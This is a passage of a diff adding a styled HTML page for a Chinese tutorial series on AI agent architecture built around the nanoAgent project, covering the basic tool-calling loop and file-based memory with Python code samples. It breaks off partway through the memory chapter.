@@ -1,0 +1,1783 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>从零开始理解 Agent — nanoAgent 系列教程</title>
+<style>
+  :root {
+    --bg: #0d1117;
+    --bg2: #161b22;
+    --bg3: #21262d;
+    --border: #30363d;
+    --text: #e6edf3;
+    --text2: #8b949e;
+    --accent: #58a6ff;
+    --accent2: #79c0ff;
+    --green: #3fb950;
+    --orange: #d29922;
+    --red: #f85149;
+    --purple: #bc8cff;
+    --teal: #39d353;
+    --code-bg: #161b22;
+    --tag-bg: #1f6feb33;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  html { scroll-behavior: smooth; }
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'PingFang SC', 'Microsoft YaHei', sans-serif;
+    line-height: 1.7;
+    display: flex;
+    min-height: 100vh;
+  }
+
+  /* ── Sidebar ── */
+  #sidebar {
+    width: 280px;
+    min-width: 280px;
+    background: var(--bg2);
+    border-right: 1px solid var(--border);
+    height: 100vh;
+    position: sticky;
+    top: 0;
+    overflow-y: auto;
+    flex-shrink: 0;
+    display: flex;
+    flex-direction: column;
+  }
+  .sidebar-logo {
+    padding: 24px 20px 16px;
+    border-bottom: 1px solid var(--border);
+  }
+  .sidebar-logo .series-badge {
+    font-size: 11px;
+    font-weight: 600;
+    color: var(--accent);
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    margin-bottom: 6px;
+  }
+  .sidebar-logo h2 {
+    font-size: 15px;
+    font-weight: 700;
+    color: var(--text);
+    line-height: 1.4;
+  }
+  .sidebar-logo p {
+    font-size: 12px;
+    color: var(--text2);
+    margin-top: 4px;
+  }
+  .sidebar-nav { padding: 12px 0; flex: 1; }
+  .nav-section-title {
+    font-size: 11px;
+    font-weight: 600;
+    color: var(--text2);
+    text-transform: uppercase;
+    letter-spacing: 0.8px;
+    padding: 8px 20px 4px;
+  }
+  .nav-item {
+    display: flex;
+    align-items: flex-start;
+    gap: 10px;
+    padding: 8px 20px;
+    cursor: pointer;
+    transition: background 0.15s;
+    border-left: 3px solid transparent;
+    text-decoration: none;
+  }
+  .nav-item:hover { background: var(--bg3); }
+  .nav-item.active {
+    background: var(--tag-bg);
+    border-left-color: var(--accent);
+  }
+  .nav-num {
+    font-size: 11px;
+    font-weight: 700;
+    color: var(--accent);
+    background: var(--tag-bg);
+    border-radius: 4px;
+    padding: 1px 6px;
+    min-width: 28px;
+    text-align: center;
+    margin-top: 2px;
+    flex-shrink: 0;
+  }
+  .nav-item.active .nav-num { background: var(--accent); color: #0d1117; }
+  .nav-text { font-size: 13px; color: var(--text); line-height: 1.4; }
+  .nav-sub { font-size: 11px; color: var(--text2); margin-top: 2px; }
+  .sidebar-footer {
+    padding: 16px 20px;
+    border-top: 1px solid var(--border);
+    font-size: 12px;
+    color: var(--text2);
+  }
+  .sidebar-footer a { color: var(--accent); text-decoration: none; }
+
+  /* ── Main ── */
+  #main { flex: 1; overflow-y: auto; }
+
+  /* ── Hero ── */
+  .hero {
+    background: linear-gradient(135deg, #0d1117 0%, #161b22 40%, #0d2137 100%);
+    border-bottom: 1px solid var(--border);
+    padding: 64px 64px 48px;
+    position: relative;
+    overflow: hidden;
+  }
+  .hero::before {
+    content: '';
+    position: absolute;
+    top: -100px;
+    right: -100px;
+    width: 400px;
+    height: 400px;
+    background: radial-gradient(circle, #1f6feb22 0%, transparent 70%);
+    pointer-events: none;
+  }
+  .hero-badge {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    background: var(--tag-bg);
+    border: 1px solid #1f6feb55;
+    border-radius: 20px;
+    padding: 4px 12px;
+    font-size: 12px;
+    color: var(--accent);
+    font-weight: 600;
+    margin-bottom: 20px;
+  }
+  .hero h1 {
+    font-size: 36px;
+    font-weight: 800;
+    line-height: 1.2;
+    margin-bottom: 16px;
+    background: linear-gradient(90deg, #e6edf3, #79c0ff);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+  }
+  .hero-desc {
+    font-size: 16px;
+    color: var(--text2);
+    max-width: 600px;
+    margin-bottom: 32px;
+    line-height: 1.8;
+  }
+  .hero-stats {
+    display: flex;
+    gap: 32px;
+    flex-wrap: wrap;
+  }
+  .stat { text-align: left; }
+  .stat-num {
+    font-size: 28px;
+    font-weight: 800;
+    color: var(--accent);
+    line-height: 1;
+  }
+  .stat-label { font-size: 12px; color: var(--text2); margin-top: 4px; }
+  .hero-formula {
+    margin-top: 32px;
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    padding: 20px 28px;
+    display: inline-flex;
+    align-items: center;
+    gap: 16px;
+    font-size: 18px;
+    font-weight: 700;
+  }
+  .formula-item {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 4px;
+  }
+  .formula-icon {
+    font-size: 28px;
+    line-height: 1;
+  }
+  .formula-label { font-size: 11px; color: var(--text2); font-weight: 400; }
+  .formula-plus { color: var(--text2); font-weight: 300; font-size: 24px; }
+  .formula-eq { color: var(--accent); font-size: 20px; }
+
+  /* ── Section ── */
+  .section {
+    padding: 56px 64px;
+    border-bottom: 1px solid var(--border);
+    scroll-margin-top: 20px;
+  }
+  .section:last-child { border-bottom: none; }
+  .section-header {
+    display: flex;
+    align-items: flex-start;
+    gap: 16px;
+    margin-bottom: 32px;
+  }
+  .section-num {
+    background: linear-gradient(135deg, var(--accent), var(--purple));
+    color: #0d1117;
+    font-size: 13px;
+    font-weight: 800;
+    width: 40px;
+    height: 40px;
+    border-radius: 10px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-shrink: 0;
+    margin-top: 2px;
+  }
+  .section-title-wrap {}
+  .section-eyebrow {
+    font-size: 11px;
+    font-weight: 600;
+    color: var(--accent);
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    margin-bottom: 4px;
+  }
+  .section-title {
+    font-size: 26px;
+    font-weight: 800;
+    color: var(--text);
+    line-height: 1.3;
+  }
+  .section-subtitle {
+    font-size: 14px;
+    color: var(--text2);
+    margin-top: 4px;
+  }
+
+  /* ── Content Blocks ── */
+  .content p {
+    color: var(--text2);
+    font-size: 15px;
+    margin-bottom: 16px;
+    line-height: 1.8;
+  }
+  .content p strong { color: var(--text); }
+  .content h3 {
+    font-size: 17px;
+    font-weight: 700;
+    color: var(--text);
+    margin: 28px 0 12px;
+    padding-left: 12px;
+    border-left: 3px solid var(--accent);
+  }
+  .content h4 {
+    font-size: 14px;
+    font-weight: 700;
+    color: var(--accent2);
+    margin: 20px 0 8px;
+  }
+
+  /* ── Callout ── */
+  .callout {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-left: 4px solid var(--accent);
+    border-radius: 8px;
+    padding: 16px 20px;
+    margin: 20px 0;
+    font-size: 14px;
+    color: var(--text2);
+  }
+  .callout.green { border-left-color: var(--green); }
+  .callout.orange { border-left-color: var(--orange); }
+  .callout.red { border-left-color: var(--red); }
+  .callout strong { color: var(--text); }
+  .callout-title {
+    font-weight: 700;
+    margin-bottom: 6px;
+    color: var(--text);
+    font-size: 13px;
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+  }
+
+  /* ── Code Block ── */
+  .code-block {
+    background: #0d1117;
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    overflow: hidden;
+    margin: 20px 0;
+    font-size: 13px;
+  }
+  .code-header {
+    background: var(--bg3);
+    border-bottom: 1px solid var(--border);
+    padding: 8px 16px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+  }
+  .code-lang {
+    font-size: 11px;
+    color: var(--text2);
+    font-weight: 600;
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+  }
+  .code-dots { display: flex; gap: 6px; }
+  .dot {
+    width: 10px; height: 10px; border-radius: 50%;
+  }
+  .dot-r { background: #ff5f57; }
+  .dot-y { background: #ffbd2e; }
+  .dot-g { background: #28ca41; }
+  pre {
+    padding: 20px;
+    overflow-x: auto;
+    margin: 0;
+  }
+  code {
+    font-family: 'JetBrains Mono', 'Fira Code', 'Cascadia Code', 'Menlo', monospace;
+    line-height: 1.6;
+    color: #e6edf3;
+  }
+  /* Syntax highlight */
+  .kw { color: #ff7b72; }    /* keyword */
+  .fn { color: #d2a8ff; }    /* function */
+  .str { color: #a5d6ff; }   /* string */
+  .cm { color: #8b949e; font-style: italic; } /* comment */
+  .num { color: #79c0ff; }   /* number */
+  .cls { color: #ffa657; }   /* class/type */
+  .op { color: #ff7b72; }    /* operator */
+  .var { color: #e6edf3; }   /* variable */
+  .key { color: #79c0ff; }   /* dict key */
+  .hl { background: #1c2a3a; display: block; margin: 0 -20px; padding: 0 20px; } /* highlight line */
+
+  /* ── Diagram ── */
+  .diagram {
+    background: #0d1117;
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 24px;
+    margin: 20px 0;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 12.5px;
+    color: #8b949e;
+    overflow-x: auto;
+    line-height: 1.6;
+    white-space: pre;
+  }
+
+  /* ── Table ── */
+  .table-wrap { overflow-x: auto; margin: 20px 0; }
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    font-size: 13px;
+  }
+  th {
+    background: var(--bg3);
+    color: var(--text2);
+    font-size: 11px;
+    font-weight: 700;
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+    padding: 10px 16px;
+    text-align: left;
+    border-bottom: 1px solid var(--border);
+  }
+  td {
+    padding: 10px 16px;
+    border-bottom: 1px solid #21262d;
+    color: var(--text2);
+    vertical-align: top;
+  }
+  td strong { color: var(--text); }
+  tr:last-child td { border-bottom: none; }
+  tr:hover td { background: #161b22aa; }
+
+  /* ── Card Grid ── */
+  .card-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+    gap: 16px;
+    margin: 20px 0;
+  }
+  .card {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 20px;
+    transition: border-color 0.2s;
+  }
+  .card:hover { border-color: var(--accent); }
+  .card-icon { font-size: 24px; margin-bottom: 10px; }
+  .card-title { font-size: 14px; font-weight: 700; color: var(--text); margin-bottom: 6px; }
+  .card-desc { font-size: 12px; color: var(--text2); line-height: 1.6; }
+
+  /* ── Tag ── */
+  .tag {
+    display: inline-block;
+    background: var(--tag-bg);
+    border: 1px solid #1f6feb44;
+    color: var(--accent);
+    font-size: 11px;
+    font-weight: 600;
+    padding: 2px 8px;
+    border-radius: 4px;
+    margin: 2px;
+  }
+  .tag.green { background: #23863633; border-color: #23863655; color: var(--green); }
+  .tag.orange { background: #9e6a0333; border-color: #9e6a0355; color: var(--orange); }
+  .tag.red { background: #da363333; border-color: #da363355; color: var(--red); }
+  .tag.purple { background: #6e40c933; border-color: #6e40c955; color: var(--purple); }
+
+  /* ── Timeline ── */
+  .timeline { margin: 20px 0; }
+  .timeline-item {
+    display: flex;
+    gap: 16px;
+    margin-bottom: 20px;
+  }
+  .timeline-dot-wrap {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    flex-shrink: 0;
+  }
+  .timeline-dot {
+    width: 32px;
+    height: 32px;
+    border-radius: 50%;
+    background: linear-gradient(135deg, var(--accent), var(--purple));
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 12px;
+    font-weight: 800;
+    color: #0d1117;
+  }
+  .timeline-line {
+    width: 2px;
+    flex: 1;
+    background: var(--border);
+    margin-top: 4px;
+  }
+  .timeline-content {
+    flex: 1;
+    padding-bottom: 8px;
+  }
+  .timeline-title {
+    font-size: 14px;
+    font-weight: 700;
+    color: var(--text);
+    margin-bottom: 4px;
+  }
+  .timeline-desc { font-size: 13px; color: var(--text2); line-height: 1.6; }
+
+  /* ── Summary Box ── */
+  .summary-box {
+    background: linear-gradient(135deg, #1f6feb11, #6e40c911);
+    border: 1px solid #1f6feb33;
+    border-radius: 12px;
+    padding: 24px 28px;
+    margin: 28px 0;
+  }
+  .summary-box h4 {
+    font-size: 13px;
+    font-weight: 700;
+    color: var(--accent);
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    margin-bottom: 12px;
+  }
+  .summary-box ul {
+    list-style: none;
+    padding: 0;
+  }
+  .summary-box ul li {
+    font-size: 14px;
+    color: var(--text2);
+    padding: 6px 0;
+    padding-left: 20px;
+    position: relative;
+    border-bottom: 1px solid #1f6feb22;
+  }
+  .summary-box ul li:last-child { border-bottom: none; }
+  .summary-box ul li::before {
+    content: '▸';
+    position: absolute;
+    left: 0;
+    color: var(--accent);
+  }
+  .summary-box ul li strong { color: var(--text); }
+
+  /* ── Progress Bar ── */
+  .progress-section {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 20px;
+    margin: 20px 0;
+  }
+  .progress-label {
+    display: flex;
+    justify-content: space-between;
+    font-size: 12px;
+    color: var(--text2);
+    margin-bottom: 8px;
+    font-weight: 600;
+  }
+  .progress-bar {
+    height: 6px;
+    background: var(--bg3);
+    border-radius: 3px;
+    overflow: hidden;
+    margin-bottom: 12px;
+  }
+  .progress-fill {
+    height: 100%;
+    background: linear-gradient(90deg, var(--accent), var(--purple));
+    border-radius: 3px;
+    transition: width 0.5s;
+  }
+
+  /* ── Scrollbar ── */
+  ::-webkit-scrollbar { width: 6px; height: 6px; }
+  ::-webkit-scrollbar-track { background: transparent; }
+  ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+  ::-webkit-scrollbar-thumb:hover { background: #484f58; }
+
+  /* ── Responsive ── */
+  @media (max-width: 900px) {
+    #sidebar { width: 240px; min-width: 240px; }
+    .hero { padding: 40px 32px 32px; }
+    .section { padding: 40px 32px; }
+  }
+  @media (max-width: 700px) {
+    body { flex-direction: column; }
+    #sidebar {
+      width: 100%;
+      height: auto;
+      position: relative;
+      min-width: unset;
+    }
+    .hero { padding: 32px 20px; }
+    .section { padding: 32px 20px; }
+    .hero h1 { font-size: 26px; }
+  }
+</style>
+</head>
+<body>
+
+<!-- ════════════════════════════════ SIDEBAR ════════════════════════════════ -->
+<nav id="sidebar">
+  <div class="sidebar-logo">
+    <div class="series-badge">📚 技术教程系列</div>
+    <h2>从零开始理解 Agent</h2>
+    <p>基于 nanoAgent 逐层拆解</p>
+  </div>
+
+  <div class="sidebar-nav">
+    <div class="nav-section-title">全部章节</div>
+
+    <a class="nav-item active" href="#s0" onclick="setActive(this)">
+      <span class="nav-num">导</span>
+      <div>
+        <div class="nav-text">系列导读</div>
+        <div class="nav-sub">总览 · 架构 · 路径</div>
+      </div>
+    </a>
+
+    <a class="nav-item" href="#s1" onclick="setActive(this)">
+      <span class="nav-num">01</span>
+      <div>
+        <div class="nav-text">底层原理，只有 100 行</div>
+        <div class="nav-sub">工具 · 循环 · 核心公式</div>
+      </div>
+    </a>
+
+    <a class="nav-item" href="#s2" onclick="setActive(this)">
+      <span class="nav-num">02</span>
+      <div>
+        <div class="nav-text">记忆与规划</div>
+        <div class="nav-sub">持久化 · Plan-then-Execute</div>
+      </div>
+    </a>
+
+    <a class="nav-item" href="#s3" onclick="setActive(this)">
+      <span class="nav-num">03</span>
+      <div>
+        <div class="nav-text">Rules、Skills 与 MCP</div>
+        <div class="nav-sub">约束 · 知识 · 工具协议</div>
+      </div>
+    </a>
+
+    <a class="nav-item" href="#s4" onclick="setActive(this)">
+      <span class="nav-num">04</span>
+      <div>
+        <div class="nav-text">SubAgent 子智能体</div>
+        <div class="nav-sub">分工 · 一次性 · 独立上下文</div>
+      </div>
+    </a>
+
+    <a class="nav-item" href="#s5" onclick="setActive(this)">
+      <span class="nav-num">05</span>
+      <div>
+        <div class="nav-text">多智能体协作与编排</div>
+        <div class="nav-sub">Teams · 持久记忆 · 通信通道</div>
+      </div>
+    </a>
+
+    <a class="nav-item" href="#s6" onclick="setActive(this)">
+      <span class="nav-num">06</span>
+      <div>
+        <div class="nav-text">上下文压缩</div>
+        <div class="nav-sub">Context Compaction · 滑动窗口</div>
+      </div>
+    </a>
+
+    <a class="nav-item" href="#s7" onclick="setActive(this)">
+      <span class="nav-num">07</span>
+      <div>
+        <div class="nav-text">安全与权限控制</div>
+        <div class="nav-sub">三道防线 · 黑名单 · Hook</div>
+      </div>
+    </a>
+  </div>
+
+  <div class="sidebar-footer">
+    <div>开源项目：<a href="https://github.com/GitHubxsy/nanoAgent" target="_blank">GitHubxsy/nanoAgent</a></div>
+    <div style="margin-top:4px;">不到 300 行代码 · 理解一切 Agent</div>
+  </div>
+</nav>
+
+<!-- ════════════════════════════════ MAIN ════════════════════════════════ -->
+<main id="main">
+
+<!-- ── Hero ── -->
+<div class="hero" id="s0">
+  <div class="hero-badge">🤖 AI Agent 系列教程 · 共 7 篇</div>
+  <h1>从零开始理解 Agent</h1>
+  <p class="hero-desc">
+    通过一个不到 300 行的开源项目 <strong>nanoAgent</strong>，逐层拆解
+    OpenClaw / Claude Code 等 AI Agent 背后的全部核心概念。<br>
+    理解了这些代码，你就理解了所有 Coding Agent 的共同底座。
+  </p>
+  <div class="hero-stats">
+    <div class="stat">
+      <div class="stat-num">7</div>
+      <div class="stat-label">核心篇章</div>
+    </div>
+    <div class="stat">
+      <div class="stat-num">&lt;300</div>
+      <div class="stat-label">行核心代码</div>
+    </div>
+    <div class="stat">
+      <div class="stat-num">∞</div>
+      <div class="stat-label">Agent 底层逻辑</div>
+    </div>
+  </div>
+
+  <div class="hero-formula">
+    <div class="formula-item">
+      <div class="formula-icon">🧠</div>
+      <div class="formula-label">LLM</div>
+    </div>
+    <div class="formula-plus">+</div>
+    <div class="formula-item">
+      <div class="formula-icon">🔧</div>
+      <div class="formula-label">工具</div>
+    </div>
+    <div class="formula-plus">+</div>
+    <div class="formula-item">
+      <div class="formula-icon">🔄</div>
+      <div class="formula-label">循环</div>
+    </div>
+    <div class="formula-eq">＝</div>
+    <div class="formula-item">
+      <div class="formula-icon">🤖</div>
+      <div class="formula-label">Agent</div>
+    </div>
+  </div>
+</div>
+
+<!-- ── 系列架构图 ── -->
+<section class="section">
+  <div class="section-header">
+    <div class="section-num">导</div>
+    <div class="section-title-wrap">
+      <div class="section-eyebrow">Series Overview</div>
+      <h2 class="section-title">系列导读：七层架构全景</h2>
+      <div class="section-subtitle">每一篇回答一个核心问题，七篇叠加构成完整 Agent 认知体系</div>
+    </div>
+  </div>
+
+  <div class="content">
+    <div class="diagram">┌──────────────────────────────────────────────────────────────┐
+│                    Agent 架构全景（七层）                          │
+│                                                                │
+│  ┌──────────────────────────┐  第七篇                          │
+│  │  安全防线                 │  黑名单 · 用户确认 · 输出截断       │
+│  ├──────────────────────────┤  第六篇                          │
+│  │  上下文压缩               │  旧消息摘要 · 轻装上阵             │
+│  ├──────────────────────────┤  第五篇                          │
+│  │  Teams 多智能体           │  持久记忆 · 身份管理 · 通信通道     │
+│  ├──────────────────────────┤  第四篇                          │
+│  │  SubAgent 子智能体        │  一次性 · 独立上下文 · 专业角色     │
+│  ├──────────────────────────┤  第三篇                          │
+│  │  Rules · Skills · MCP    │  行为约束 · 技能注册 · 工具协议     │
+│  ├──────────────────────────┤  第二篇                          │
+│  │  记忆 · 规划              │  文件持久化 · Plan-then-Execute   │
+│  ├──────────────────────────┤  第一篇                          │
+│  │  LLM · 工具 · 循环        │  核心公式 · 100 行               │
+│  └──────────────────────────┘                                  │
+└──────────────────────────────────────────────────────────────┘</div>
+
+    <div class="table-wrap">
+      <table>
+        <tr>
+          <th>篇</th>
+          <th>文件（行数）</th>
+          <th>核心概念</th>
+          <th>解决什么问题</th>
+        </tr>
+        <tr><td><strong style="color:var(--accent)">第一篇</strong></td><td>agent-essence.py (100行)</td><td><span class="tag">LLM</span><span class="tag">工具</span><span class="tag">循环</span></td><td>Agent 如何自主工作</td></tr>
+        <tr><td><strong style="color:var(--accent)">第二篇</strong></td><td>agent-memory.py (182行)</td><td><span class="tag">记忆</span><span class="tag">规划</span></td><td>Agent 如何记住过去、规划未来</td></tr>
+        <tr><td><strong style="color:var(--accent)">第三篇</strong></td><td>agent-skills-mcp.py (265行)</td><td><span class="tag">Rules</span><span class="tag">Skills</span><span class="tag">MCP</span></td><td>Agent 如何扩展知识和工具</td></tr>
+        <tr><td><strong style="color:var(--accent)">第四篇</strong></td><td>agent-subagent.py (192行)</td><td><span class="tag">SubAgent</span></td><td>Agent 如何临时找帮手</td></tr>
+        <tr><td><strong style="color:var(--accent)">第五篇</strong></td><td>agent-teams.py (270行)</td><td><span class="tag">Teams</span><span class="tag">通信</span></td><td>Agent 如何组建持久团队</td></tr>
+        <tr><td><strong style="color:var(--accent)">第六篇</strong></td><td>agent-compact.py (169行)</td><td><span class="tag">压缩</span></td><td>Agent 如何在有限窗口内持续工作</td></tr>
+        <tr><td><strong style="color:var(--accent)">第七篇</strong></td><td>agent-safe.py (219行)</td><td><span class="tag red">安全</span><span class="tag red">防线</span></td><td>Agent 不能做什么</td></tr>
+      </table>
+    </div>
+  </div>
+</section>
+
+<!-- ══════════════════════════════════════════════════════════ -->
+<!-- 第一篇 -->
+<!-- ══════════════════════════════════════════════════════════ -->
+<section class="section" id="s1">
+  <div class="section-header">
+    <div class="section-num">01</div>
+    <div class="section-title-wrap">
+      <div class="section-eyebrow">Chapter 1 · 100 Lines</div>
+      <h2 class="section-title">底层原理，只有 100 行</h2>
+      <div class="section-subtitle">理解 Agent 的最小本质：LLM + 工具 + 循环</div>
+    </div>
+  </div>
+
+  <div class="content">
+    <div class="callout">
+      <div class="callout-title">核心公式</div>
+      <strong>Agent = LLM + 工具 + 循环</strong>。普通对话是"你问我答"，Agent 是"你给我一个目标，我自己想办法完成"。这三个要素缺一不可。
+    </div>
+
+    <h3>普通对话 vs Agent</h3>
+    <div class="table-wrap">
+      <table>
+        <tr><th>维度</th><th>普通对话（Chat）</th><th>Agent</th></tr>
+        <tr><td>交互模式</td><td>一问一答，用户驱动</td><td>自主循环，目标驱动</td></tr>
+        <tr><td>能力边界</td><td>只能生成文本</td><td>可以调用工具，作用于真实世界</td></tr>
+        <tr><td>状态管理</td><td>每轮独立</td><td>维护完整消息历史，含工具调用与结果</td></tr>
+        <tr><td>自主性</td><td>无</td><td>LLM 自主决定"下一步做什么"、"何时停止"</td></tr>
+      </table>
+    </div>
+
+    <h3>四大模块</h3>
+    <div class="card-grid">
+      <div class="card">
+        <div class="card-icon">⚙️</div>
+        <div class="card-title">LLM 客户端初始化</div>
+        <div class="card-desc">使用 OpenAI SDK，通过 base_url 环境变量支持任何兼容 API 的服务（DeepSeek、Qwen 等）</div>
+      </div>
+      <div class="card">
+        <div class="card-icon">📋</div>
+        <div class="card-title">工具定义（Tool Schema）</div>
+        <div class="card-desc">JSON Schema 格式的"工具说明书"，随每次 API 请求发送给 LLM，让它"知道"自己有哪些能力</div>
+      </div>
+      <div class="card">
+        <div class="card-icon">⚡</div>
+        <div class="card-title">工具实现（Functions）</div>
+        <div class="card-desc">execute_bash、read_file、write_file 三个 Python 函数，把 LLM 的"意图"变成"行动"</div>
+      </div>
+      <div class="card">
+        <div class="card-icon">🔄</div>
+        <div class="card-title">Agent 循环（Core Loop）</div>
+        <div class="card-desc">20 行最精华代码：发送 → LLM 决策 → 有 tool_call 则执行 → 结果追加 → 循环</div>
+      </div>
+    </div>
+
+    <h3>核心循环代码</h3>
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dots"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span></div>
+        <div class="code-lang">Python · agent-essence.py（核心循环）</div>
+      </div>
+      <pre><code><span class="kw">def</span> <span class="fn">run_agent</span>(user_message, max_iterations=<span class="num">5</span>):
+    messages = [
+        {<span class="str">"role"</span>: <span class="str">"system"</span>, <span class="str">"content"</span>: <span class="str">"You are a helpful assistant..."</span>},
+        {<span class="str">"role"</span>: <span class="str">"user"</span>,   <span class="str">"content"</span>: user_message}
+    ]
+
+    <span class="kw">for</span> _ <span class="kw">in</span> <span class="fn">range</span>(max_iterations):
+        <span class="cm"># Step 1: 把完整对话历史 + 工具列表发给 LLM</span>
+        response = client.chat.completions.<span class="fn">create</span>(
+            model=MODEL, messages=messages, tools=tools
+        )
+        message = response.choices[<span class="num">0</span>].message
+        messages.<span class="fn">append</span>(message)
+
+        <span class="cm"># Step 2: 没有 tool_call → 任务完成，返回文本</span>
+        <span class="kw">if not</span> message.tool_calls:
+            <span class="kw">return</span> message.content
+
+        <span class="cm"># Step 3: 有 tool_call → 逐个执行，结果追加到历史</span>
+        <span class="kw">for</span> tool_call <span class="kw">in</span> message.tool_calls:
+            function_name = tool_call.function.name
+            function_args = json.<span class="fn">loads</span>(tool_call.function.arguments)
+            function_response = available_functions[function_name](**function_args)
+            messages.<span class="fn">append</span>({
+                <span class="str">"role"</span>: <span class="str">"tool"</span>,
+                <span class="str">"tool_call_id"</span>: tool_call.id,
+                <span class="str">"content"</span>: function_response
+            })
+
+    <span class="kw">return</span> <span class="str">"Max iterations reached"</span></code></pre>
+    </div>
+
+    <h3>运行时序图：一次完整的 Agent 执行</h3>
+    <div class="diagram">用户任务："统计当前目录下有多少个 Python 文件，并把结果写入 count.txt"
+  │
+  ▼
+┌────────────────────────────────────────────────────────────┐
+│                      Agent Loop                             │
+│                                                             │
+│  ① 发送 messages + tools ──▶  LLM 决策                     │
+│                                   │                         │
+│                              有 tool_call?                  │
+│                           Yes │         │ No                │
+│                               ▼         ▼                   │
+│                         执行工具      返回文本 ──▶ 结束      │
+│                               │                             │
+│    结果追加到 messages  ◀─────┘                             │
+│           │                                                 │
+│    下一轮循环 ──▶ 继续发送给 LLM                             │
+└────────────────────────────────────────────────────────────┘
+
+轮次 1: execute_bash("find . -name '*.py' | wc -l") → "42\n"
+轮次 2: write_file("count.txt", "Python files: 42") → "Success"
+轮次 3: LLM 判断任务完成 → 返回文本，退出循环</div>
+
+    <h3>关键设计洞察</h3>
+    <div class="callout orange">
+      <div class="callout-title">⚡ 最重要的认知</div>
+      <strong>LLM 不执行代码，只输出意图。</strong>LLM 的职责是"思考 + 生成工具调用指令（JSON）"，代码的职责是"解析指令 + 执行工具 + 返回结果"。LLM 是大脑，代码是手脚。
+    </div>
+
+    <div class="summary-box">
+      <h4>第一篇核心要点</h4>
+      <ul>
+        <li><strong>messages 列表</strong>是 Agent 的短期记忆，每轮循环都会累积行动-观察历史</li>
+        <li><strong>available_functions 字典</strong>是工具调度核心，通过工具名找到对应 Python 函数</li>
+        <li><strong>max_iterations</strong>是安全阀，防止 LLM 陷入死循环</li>
+        <li><strong>tool_call_id</strong>用于关联工具调用与返回结果，支持并行调用</li>
+      </ul>
+    </div>
+  </div>
+</section>
+
+<!-- ══════════════════════════════════════════════════════════ -->
+<!-- 第二篇 -->
+<!-- ══════════════════════════════════════════════════════════ -->
+<section class="section" id="s2">
+  <div class="section-header">
+    <div class="section-num">02</div>
+    <div class="section-title-wrap">
+      <div class="section-eyebrow">Chapter 2 · Memory &amp; Planning</div>
+      <h2 class="section-title">记忆与规划</h2>
+      <div class="section-subtitle">从"金鱼"到"带笔记本的实习生"：多 67 行，能力质变</div>
+    </div>
+  </div>
+
+  <div class="content">
+    <div class="callout">
+      <div class="callout-title">本篇新增能力</div>
+      <strong>跨会话记忆</strong>（agent_memory.md 文件持久化）＋ <strong>任务规划</strong>（Plan-then-Execute 范式）＋ <strong>多步串联</strong>（步骤间共享 messages 上下文）
+    </div>
+
+    <h3>两种记忆类型</h3>
+    <div class="table-wrap">
+      <table>
+        <tr><th>记忆类型</th><th>载体</th><th>生命周期</th><th>实现方式</th></tr>
+        <tr><td><strong>短期记忆</strong></td><td>messages 列表</td><td>单次运行内</td><td>步骤间共享的对话历史</td></tr>
+        <tr><td><strong>长期记忆</strong></td><td>agent_memory.md 文件</td><td>跨多次运行</td><td>注入 system prompt 的 "Previous context"</td></tr>
+      </table>
+    </div>
+
+    <h3>记忆的实现：存储 + 加载 + 注入</h3>
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dots"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span></div>
+        <div class="code-lang">Python · agent-memory.py（记忆三步骤）</div>
+      </div>
+      <pre><code><span class="cm"># ① 存储：每次任务完成后追加写入</span>
+<span class="kw">def</span> <span class="fn">save_memory</span>(task, result):
+    timestamp = datetime.now().<span class="fn">strftime</span>(<span class="str">"%Y-%m-%d %H:%M:%S"</span>)
+    entry = <span class="str">f"\n## {timestamp}\n**Task:** {task}\n**Result:** {result}\n"</span>
+    <span class="kw">with</span> <span class="fn">open</span>(MEMORY_FILE, <span class="str">'a'</span>) <span class="kw">as</span> f:
+        f.<span class="fn">write</span>(entry)
+
+<span class="cm"># ② 加载：滑动窗口，只取最后 50 行</span>
+<span class="kw">def</span> <span class="fn">load_memory</span>():
+    <span class="kw">with</span> <span class="fn">open</span>(MEMORY_FILE, <span class="str">'r'</span>) <span class="kw">as</span> f:
+        content = f.<span class="fn">read</span>()
+    lines = content.<span class="fn">split</span>(<span class="str">'\n'</span>)
+    <span class="kw">return</span> <span class="str">'\n'</span>.<span class="fn">join</span>(lines[-<span class="num">50</span>:])  <span class="cm"># 滑动窗口截断</span>
+
+<span class="cm"># ③ 注入：塞进 system prompt</span>
+memory = <span class="fn">load_memory</span>()
+system_prompt = <span class="str">"You are a helpful assistant."</span>
+<span class="kw">if</span> memory:
+    system_prompt += <span class="str">f"\n\nPrevious context:\n{memory}"</span></code></pre>
+    </div>
+
+    <div class="callout green">
+      <div class="callout-title">💡 记忆的本质</div>
